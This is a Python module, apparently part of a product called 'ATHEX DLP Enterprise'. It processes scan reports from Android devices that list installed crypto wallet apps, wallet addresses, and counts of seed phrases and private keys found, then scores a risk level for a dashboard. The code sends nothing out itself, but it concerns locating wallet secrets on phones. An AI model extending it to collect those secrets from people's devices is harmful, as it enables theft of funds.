"""
ATHEX DLP Enterprise - Crypto Module
=====================================
Processes cryptocurrency wallet data from Android devices.
"""

import json
import logging
from datetime import datetime
from typing import Dict, List, Any

logger = logging.getLogger(__name__)


class CryptoHandler:
    """Handles cryptocurrency data processing"""
    
    def __init__(self):
        self.crypto_data: Dict[str, Dict] = {}
        logger.info("CryptoHandler initialized")
    
    def process(self, session_id: str, raw_data: Any) -> Dict:
        """
        Process crypto wallet data from device.
        
        Args:
            session_id: Device session ID
            raw_data: Crypto scan data dictionary
            
        Returns:
            Processed crypto data
        """
        try:
            if isinstance(raw_data, str):
                data = json.loads(raw_data)
            else:
                data = raw_data
            
            if not isinstance(data, dict):
                return {"success": False, "error": "Invalid crypto data"}
            
            installed_wallets = data.get("installed_wallets", [])
            scan_results = data.get("scan_results", {})
            
            processed = {
                "session_id": session_id,
                "wallets_found": len(installed_wallets),
                "wallets": [],
                "addresses_found": 0,
                "addresses": [],
                "seed_phrases_found": 0,
                "private_keys_found": 0,
                "files_scanned": scan_results.get("files_scanned", 0),
                "timestamp": datetime.now().isoformat()
            }
            
            # Process wallets
            for wallet in installed_wallets:
                processed["wallets"].append({
                    "name": wallet.get("name", "Unknown"),
                    "package": wallet.get("package_name", ""),
                    "category": wallet.get("category", ""),
                    "data_dir": wallet.get("data_dir", "")
                })
            
            # Process addresses
            addresses = scan_results.get("addresses_found", [])
            for addr in addresses:
                processed["addresses"].append({
                    "address": addr.get("address", ""),
                    "type": addr.get("type", ""),
                    "source": addr.get("source_file", addr.get("source", ""))
                })
            processed["addresses_found"] = len(addresses)
            
            # Seed phrases
            seeds = scan_results.get("seed_phrases_found", [])
            processed["seed_phrases_found"] = len(seeds)
            
            # Private keys
            keys = scan_results.get("private_keys_found", [])
            processed["private_keys_found"] = len(keys)
            
            self.crypto_data[session_id] = processed
            
            logger.info(f"🔐 Crypto: {len(installed_wallets)} wallets, "
                       f"{processed['addresses_found']} addresses from {session_id}")
            
            return {
                "success": True,
                "data": processed
            }
            
        except Exception as e:
            logger.error(f"Error processing crypto data: {e}")
            return {"success": False, "error": str(e)}
    
    def get_wallets(self, session_id: str) -> list:
        """Get detected wallets"""
        data = self.crypto_data.get(session_id, {})
        return data.get("wallets", [])
    
    def get_addresses(self, session_id: str, crypto_type: str = None) -> list:
        """Get detected addresses, optionally filtered by type"""
        data = self.crypto_data.get(session_id, {})
        addresses = data.get("addresses", [])
        
        if crypto_type:
            return [a for a in addresses if crypto_type.lower() in a.get("type", "").lower()]
        
        return addresses
    
    def get_address_summary(self, session_id: str) -> Dict:
        """Get address summary by type"""
        addresses = self.get_addresses(session_id)
        
        summary = {}
        for addr in addresses:
            addr_type = addr.get("type", "Unknown")
            summary[addr_type] = summary.get(addr_type, 0) + 1
        
        return summary
    
    def format_for_dashboard(self, data: Dict) -> Dict:
        """Format crypto data for dashboard"""
        return {
            "wallets_found": data.get("wallets_found", 0),
            "wallets": [
                {
                    "name": w.get("name", ""),
                    "category": w.get("category", ""),
                    "icon": self._get_wallet_icon(w.get("name", ""))
                }
                for w in data.get("wallets", [])
            ],
            "addresses_found": data.get("addresses_found", 0),
            "seed_phrases_found": data.get("seed_phrases_found", 0),
            "private_keys_found": data.get("private_keys_found", 0),
            "address_summary": {},  # Filled separately
            "risk_level": self._calculate_risk(data)
        }
    
    def _get_wallet_icon(self, wallet_name: str) -> str:
        icons = {
            "Trust Wallet": "🟡",
            "MetaMask": "🦊",
            "Binance": "🔶",
            "Coinbase": "🔵",
            "Exodus": "🔷",
            "Blockchain": "⬜",
            "Phantom": "👻",
            "Ledger": "🔒"
        }
        for key, icon in icons.items():
            if key.lower() in wallet_name.lower():
                return icon
        return "💰"
    
    def _calculate_risk(self, data: Dict) -> str:
        """Calculate risk level based on findings"""
        score = 0
        
        if data.get("wallets_found", 0) > 0:
            score += 1
        if data.get("seed_phrases_found", 0) > 0:
            score += 3
        if data.get("private_keys_found", 0) > 0:
            score += 3
        if data.get("addresses_found", 0) > 5:
            score += 1
        
        if score >= 6:
            return "critical"
        elif score >= 3:
            return "high"
        elif score >= 1:
            return "medium"
        return "low"


crypto_handler = CryptoHandler()